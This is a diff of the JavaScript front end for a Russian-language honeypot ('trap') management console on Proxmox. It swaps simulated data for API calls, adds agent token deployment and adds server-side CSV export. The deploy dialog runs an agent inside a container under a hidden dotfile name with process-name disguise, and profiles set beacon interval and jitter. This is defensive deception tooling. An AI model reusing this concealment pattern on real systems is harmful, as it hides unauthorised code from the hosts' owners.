       if (errs.length) { err.textContent = errs.join("\n"); return; }
-      traps.push(trap(name, c.name, p, 0));
-      closeModal(); renderAll();
-      toast(cState(c) === "online" ? "«" + name + "» добавлена — агент запустит её при ближайшем опросе" : "Ловушка «" + name + "» добавлена");
+      try { await api("/api/traps", { method: "POST", body: { name, profile_id: profileByName(p).id, machine_vmid: c.vmid } }); }
+      catch (e) { err.textContent = e.message; return; }
+      closeModal(); toast("Ловушка «" + name + "» добавлена — подключите к ней агента в окне ловушки");
+      await refresh();
     };
   });
 }
@@ -607,11 +649,10 @@ function openContainerSettings(c) {
   const t = TYPE_INFO[c.type];
   openModal("Настройки «" + c.name + "»", (body) => {
     body.append(kv([["Тип", t.label + " — " + t.title], ["VMID / нода", t.kind + " " + c.vmid + " · " + c.node], ["Состояние", stateBadge(cState(c))],
-      ["Сеть", PVE.bridgeLabel], ["Порты", containerPorts(c.name).join(", ") || "—"]]));
+      ["Сеть", PVE.bridgeLabel], ["IP в DMZ", c.host || "—"], ["Порты", containerPorts(c.name).join(", ") || "—"]]));
     const nameIn = el("input"); nameIn.value = c.name; nameIn.maxLength = 60; nameIn.setAttribute("aria-label", "Имя");
-    const hostIn = el("input"); hostIn.value = c.host; hostIn.placeholder = "выдаётся по DHCP в DMZ"; hostIn.setAttribute("aria-label", "IP");
     const res = resourceFields(c);
-    body.append(field("Имя (hostname)", nameIn), field("IP в DMZ", hostIn), el("h4", "Ресурсы"), res.grid, res.reset);
+    body.append(field("Имя (hostname)", nameIn), el("h4", "Ресурсы"), res.grid, res.reset);
     body.append(el("h4", "Ловушки"));
     const list = el("div", undefined, "titems"); body.append(list);
     const drawList = () => {
@@ -628,17 +669,18 @@ function openContainerSettings(c) {
     const save = el("button", "Сохранить", "btn"), addB = el("button", "+ Добавить ловушку", "ghost"), cancel = el("button", "Закрыть", "ghost");
     addB.onclick = () => openAddTrap(c); cancel.onclick = closeModal;
     const actions = el("div", undefined, "actions"); actions.append(save, addB, cancel); body.append(actions);
-    save.onclick = () => {
-      const name = nameIn.value.trim(), host = hostIn.value.trim();
-      if (!/^[A-Za-z0-9-]{1,60}$/.test(name)) { err.textContent = "Имя (hostname): латиница, цифры и дефис"; return; }
+    save.onclick = async () => {
+      const name = nameIn.value.trim();
+      if (!/^[A-Za-z0-9][A-Za-z0-9-]{0,59}$/.test(name)) { err.textContent = "Имя (hostname): латиница, цифры и дефис"; return; }
       if (name !== c.name && containerByName(name)) { err.textContent = "Машина с таким именем уже есть"; return; }
-      if (host && !/^[A-Za-z0-9.:-]{1,253}$/.test(host)) { err.textContent = "IP: цифры, точки, двоеточия"; return; }
       const r = res.read(c.disk); if (r.error) { err.textContent = r.error; return; }
-      const changed = r.value.cores !== c.cores || r.value.ram !== c.ram || r.value.disk !== c.disk;
-      for (const x of traps) if (x.container === c.name) x.container = name;
-      Object.assign(c, { name, host }, r.value);
-      closeModal(); renderAll();
-      toast(changed ? t.cli + " set " + c.vmid + " --cores " + c.cores + " --memory " + c.ram * 1024 + (c.type === "kvm" ? " — применится после перезапуска" : " — применено") : "Настройки сохранены");
+      const body = { cores: r.value.cores, memory_gb: r.value.ram, disk_gb: r.value.disk };
+      if (name !== c.name) body.name = name;
+      save.disabled = true;
+      try { await api("/api/machines/" + c.vmid, { method: "PUT", body }); }
+      catch (e) { err.textContent = e.message; save.disabled = false; return; }
+      closeModal(); toast(t.cli + " set " + c.vmid + " — применено" + (c.type === "kvm" ? " (ресурсы KVM — после перезапуска)" : ""));
+      await refresh();
     };
   });
 }
@@ -764,9 +806,12 @@ function openTrap(name) {
   const t = trapByName(name); if (!t) return;
   openModal("Ловушка «" + t.name + "»", (body) => {
     const head = el("div", undefined, "inline"); head.style.marginBottom = "12px";
-    head.append(stateBadge(trapState(t)), switchEl(t.enabled, t.enabled ? "Выключить ловушку" : "Включить ловушку", () => {
-      t.enabled = !t.enabled; renderAll(); toast(t.enabled ? "Ловушка включена" : "Ловушка выключена"); openTrap(t.name);
-    }));
+    const patch = async (body, msg, newName) => {
+      try { await api("/api/traps/" + t.id, { method: "PATCH", body }); toast(msg); } catch (e) { fail(e); return; }
+      await refresh(); openTrap(newName || t.name);
+    };
+    head.append(stateBadge(trapState(t)), switchEl(t.enabled, t.enabled ? "Выключить ловушку (агент закроет её порты)" : "Включить ловушку", () =>
+      patch({ enabled: !t.enabled }, t.enabled ? "Ловушка выключена" : "Ловушка включена")));
     body.append(head);
 
     const nameIn = el("input"); nameIn.value = t.name; nameIn.maxLength = 60; nameIn.style.width = "220px"; nameIn.setAttribute("aria-label", "Имя ловушки");
@@ -775,7 +820,7 @@ function openTrap(name) {
       const n = nameIn.value.trim();
       if (!/^[A-Za-z0-9._-]{1,60}$/.test(n)) { toast("Имя: латиница, цифры, точка, дефис, подчёркивание", true); return; }
       if (n !== t.name && trapByName(n)) { toast("Ловушка с таким именем уже есть", true); return; }
-      t.name = n; renderAll(); toast("Переименовано"); openTrap(n);
+      patch({ name: n }, "Переименовано", n);
     };
     const nrow = el("div", undefined, "inline"); nrow.append(nameIn, ren);
 
@@ -785,7 +830,7 @@ function openTrap(name) {
       const target = csel.value; if (target === t.container) return;
       const errs = portConflicts([...trapsOf(target), t].map((x) => ({ name: x.name, profile: x.profile })));
       if (errs.length) { toast("Нельзя переместить: " + errs[0], true); return; }
-      t.container = target; renderAll(); toast("Ловушка перемещена в «" + target + "»"); openTrap(t.name);
+      patch({ machine_vmid: containerByName(target).vmid }, "Ловушка перемещена в «" + target + "» — подключите к ней агента там");
     };
     const crow = el("div", undefined, "inline"); crow.append(csel, move);
 
@@ -794,7 +839,7 @@ function openTrap(name) {
     apply.onclick = () => {
       const errs = portConflicts(trapsOf(t.container).map((x) => ({ name: x.name, profile: x === t ? psel.value : x.profile })));
       if (errs.length) { toast("Нельзя сменить тип: " + errs[0], true); return; }
-      t.profile = psel.value; renderAll(); toast("Тип ловушки обновлён — агент подтянет конфиг"); openTrap(t.name);
+      patch({ profile_id: profileByName(psel.value).id }, "Тип ловушки обновлён — агент подтянет конфиг");
     };
     const prow = el("div", undefined, "inline"); prow.append(psel, apply);
     body.append(kv([["Имя", nrow], ["Машина", crow], ["Профиль", prow], ["Порты", portsOf(t.profile).join(", ")], ["Событий", t.events]]));
@@ -802,8 +847,10 @@ function openTrap(name) {
     const actions = el("div", undefined, "inline");
     const bOpen = el("button", "▦ Показать машину", "ghost"); bOpen.onclick = () => { closeModal(); showTab("containers"); $("c-q").value = t.container; S.cFilter.q = t.container; renderContainers(); };
     const bEv = el("button", "☰ Все события ловушки", "ghost"); bEv.onclick = () => { closeModal(); showTab("dash"); setFilter({ trap: t.name, type: "", q: "" }); };
+    const bAgent = el("button", "⚡ Подключить агента", "ghost"); bAgent.title = "Выпустить новый токен и показать команду запуска агента для этой ловушки";
+    armed(bAgent, "Старый токен перестанет работать. Точно?", () => openAgentDeploy(t));
     const bDel = el("button", "🗑 Удалить", "ghost danger"); armed(bDel, "Точно удалить?", () => { closeModal(); removeTrap(t); });
-    actions.append(bOpen, bEv, bDel); body.append(actions);
+    actions.append(bOpen, bEv, bAgent, bDel); body.append(actions);
 
     body.append(el("h4", "Последние события"));
     const mine = S.events.filter((e) => e.trap === t.name).slice(0, 8);
@@ -815,6 +862,25 @@ function openTrap(name) {
       makeClickable(tr, () => openEvent(ev)); tb.append(tr);
     }
     table.append(tb); body.append(table);
+  });
+}
+
+async function openAgentDeploy(t) {
+  let d;
+  try { d = await api("/api/traps/" + t.id + "/deploy", { method: "POST", body: { kind: "script" } }); } catch (e) { fail(e); return; }
+  const c = containerByName(t.container);
+  openModal("Агент для «" + t.name + "»", (body) => {
+    body.append(el("p", "Токен выпущен заново и показан один раз. Запустите агента внутри машины" + (c ? " «" + c.name + "» (" + TYPE_INFO[c.type].kind + " " + c.vmid + ")" : "") +
+      ": код агента (папка agent/netsvc) и зависимости asyncssh, setproctitle должны лежать рядом.", "hint"));
+    const pre = el("pre", d.artifact); body.append(pre);
+    if (c) {
+      body.append(el("h4", "Через хост Proxmox"));
+      body.append(el("pre", "pct exec " + c.vmid + " -- sh -c 'cat > /opt/.netsvc.sh' < agent.sh\npct exec " + c.vmid + " -- sh /opt/.netsvc.sh"));
+    }
+    const row = el("div", undefined, "actions");
+    const b = el("button", "Копировать команду", "btn"); b.onclick = () => copy(d.artifact);
+    const close = el("button", "Закрыть", "ghost"); close.onclick = closeModal;
+    row.append(b, close); body.append(row);
   });
 }
 
@@ -959,9 +1025,9 @@ function readEditor() {
   if (!(beacon >= 5 && beacon <= 300)) return { error: "Интервал маяка: 5–300 с" };
   if (!(jitter >= 0 && jitter <= 0.9)) return { error: "Джиттер: 0–0.9" };
   const old = S.editing ? profileByName(S.editing) : null;
-  return { profile: { name, level, services, users, tokens, beacon, jitter, desc: old ? old.desc : "" } };
+  return { profile: { id: old ? old.id : null, name, level, services, users, tokens, beacon, jitter, desc: old ? old.desc : "" } };
 }
-$("p-save").onclick = () => {
+$("p-save").onclick = async () => {
   const r = readEditor(); if (r.error) { toast(r.error, true); return; }
   const p = r.profile;
   if (profiles.some((x) => x.name === p.name && x.name !== S.editing)) { toast("Профиль с таким именем уже есть", true); return; }
@@ -971,21 +1037,21 @@ $("p-save").onclick = () => {
       const errs = portConflicts(trapsOf(c.name).map((t) => ({ name: t.name, profile: t.profile })), lookup);
       if (errs.length) { toast("Конфликт в «" + c.name + "»: " + errs[0], true); return; }
     }
-    const old = profileByName(S.editing), oldName = old.name;
-    Object.assign(old, p);
-    for (const t of traps) if (t.profile === oldName) t.profile = p.name;
-    toast("Профиль сохранён"); setEditing(p.name);
-  } else {
-    profiles.push(p); toast("Профиль создан — его можно выбрать при добавлении ловушки"); clearEditor(); setEditing(null);
   }
-  renderAll();
+  try {
+    if (p.id) await api("/api/profiles/" + p.id, { method: "PUT", body: profileToApi(p) });
+    else await api("/api/profiles", { method: "POST", body: profileToApi(p) });
+  } catch (e) { fail(e); return; }
+  await refresh();
+  if (S.editing) { toast("Профиль сохранён — ловушки получат новые настройки при ближайшем опросе"); setEditing(p.name); }
+  else { toast("Профиль создан — его можно выбрать при добавлении ловушки"); clearEditor(); setEditing(null); }
 };
 $("p-cancel").onclick = () => { clearEditor(); setEditing(null); };
-armed($("p-delete"), "Точно удалить?", () => {
-  const name = S.editing;
-  if (traps.some((t) => t.profile === name)) { toast("Профиль используется ловушками: сначала смените им тип", true); return; }
-  profiles.splice(profiles.indexOf(profileByName(name)), 1);
-  clearEditor(); setEditing(null); renderAll(); toast("Профиль удалён");
+armed($("p-delete"), "Точно удалить?", async () => {
+  const pr = profileByName(S.editing); if (!pr) return;
+  if (traps.some((t) => t.profile === pr.name)) { toast("Профиль используется ловушками: сначала смените им тип", true); return; }
+  try { await api("/api/profiles/" + pr.id, { method: "DELETE" }); } catch (e) { fail(e); return; }
+  clearEditor(); setEditing(null); await refresh(); toast("Профиль удалён");
 });
 
 // ============ ПАНЕЛЬ ============
@@ -995,18 +1061,19 @@ $("f-trap").onchange = (e) => setFilter({ trap: e.target.value });
 $("f-q").oninput = (e) => { S.filter.q = e.target.value; renderFeed(); renderTops(true); };
 $("f-reset").onclick = () => setFilter({ type: "", trap: "", q: "" });
 $("f-clear").onclick = () => { S.events.length = 0; renderFeed(); toast("Лента очищена"); };
-$("f-pause").onclick = () => { S.paused = !S.paused; $("f-pause").textContent = S.paused ? "▶ Продолжить" : "⏸ Пауза"; toast(S.paused ? "Поток остановлен" : "Поток возобновлён"); };
-$("f-csv").onclick = () => {
-  const rows = S.events.filter(matches);
-  if (!rows.length) { toast("Нечего экспортировать", true); return; }
-  const head = ["id", "time", "machine", "trap", "type", "src_ip", "src_port", "dst_port", "proto", "username", "password", "command"];
-  const lines = rows.map((e) => [e.id, new Date(e.ts).toISOString(), e.container, e.trap, e.type, e.src_ip, e.src_port, e.dst_port, e.proto, e.username, e.password, e.command].map(csvCell).join(","));
-  download("events.csv", [head.join(","), ...lines].join("\n")); toast("Экспортировано событий: " + rows.length);
+$("f-pause").onclick = () => {
+  S.paused = !S.paused; $("f-pause").textContent = S.paused ? "▶ Продолжить" : "⏸ Пауза";
+  if (!S.paused) renderFeed();  // показываем всё, что пришло за время паузы
+  toast(S.paused ? "Лента на паузе: события продолжают копиться" : "Лента возобновлена");
 };
-$("ioc-csv").onclick = () => {
-  const lines = Object.entries(S.src).sort((a, b) => b[1] - a[1]).map(([ip, n]) => [ip, n].map(csvCell).join(","));
-  download("iocs.csv", ["ip,events", ...lines].join("\n")); toast("Экспортировано IP: " + lines.length);
+$("f-csv").onclick = () => {  // выгрузка из базы центра с теми же фильтрами, а не только того, что на экране
+  const q = new URLSearchParams();
+  if (S.filter.type) q.set("type", S.filter.type);
+  const t = trapByName(S.filter.trap); if (t) q.set("trap_id", t.id);
+  if (S.filter.q) q.set("q", S.filter.q);
+  location.href = "/api/events/export.csv?" + q;
 };
+$("ioc-csv").onclick = () => { location.href = "/api/iocs.csv"; };
 makeClickable($("kpi-total"), () => { setFilter({ type: "", trap: "", q: "" }); toast("Фильтры сброшены"); });
 makeClickable($("kpi-auth"), () => setFilter({ type: "auth_attempt", trap: "", q: "" }));
 makeClickable($("kpi-alert"), () => setFilter({ type: "alert", trap: "", q: "" }));
@@ -1018,23 +1085,22 @@ $("logout").onclick = async () => {
   catch (_) { /* уходим на вход в любом случае */ }
   location.replace("/");
 };
+// ============ ЗАПУСК ============
+renderLegend(); renderAll(); renderFeed(); renderTops(true);
 fetch("/api/auth/me", { credentials: "same-origin" })
   .then((r) => { if (!r.ok) throw new Error("no session"); return r.json(); })
-  .then((d) => { csrf = d.csrf; $("who").textContent = d.username; $("role").textContent = d.role; })
+  .then(async (d) => {
+    csrf = d.csrf; $("who").textContent = d.username; $("role").textContent = d.role;
+    await refresh(); await Promise.all([loadEvents(), loadStats()]);
+    connectStream();
+    setInterval(refresh, 5000);       // машины, ловушки, профили: статусы и «на связи»
+    setInterval(loadStats, 30000);    // агрегаты пересчитывает центр
+    setInterval(() => { S.buckets.shift(); S.buckets.push(0); renderKpis(); }, 60000);
+    setInterval(refreshCells, 1000);
+  })
   .catch(() => location.replace("/"));  // нет сессии: на страницу входа
-
-// ============ ЗАПУСК ============
-for (let i = 0; i < 16; i++) { const ev = fakeEvent(); if (ev) { ev.ts = Date.now() - (16 - i) * rnd(4000, 9000); S.events.unshift(ev); } }
-renderLegend(); renderAll(); renderFeed(); renderTops(true);
 
 function refreshCells() {  // текст обновляется на месте — карточки и строки не пересоздаются
   for (const n of document.querySelectorAll(".c-seen")) { const c = containers.find((x) => String(x.id) === n.dataset.c); if (c) n.textContent = since(c.seen); }
   for (const n of document.querySelectorAll("[data-trap].ev, [data-trap].c-ev")) { const t = traps.find((x) => String(x.id) === n.dataset.trap); if (t) n.textContent = String(t.events); }
 }
-setInterval(() => {
-  if (S.paused) return;
-  const ev = fakeEvent(); if (!ev) return;
-  ingest(ev); addToFeed(ev); renderKpis(); renderTops(); refreshCells();
-}, 1800);
-setInterval(() => { for (const c of containers) if (cState(c) === "online" && Math.random() > 0.3) c.seen = Date.now() - rnd(0, 8) * 1000; refreshCells(); }, 4000);
-setInterval(() => { S.buckets.shift(); S.buckets.push(0); renderKpis(); }, 60000);
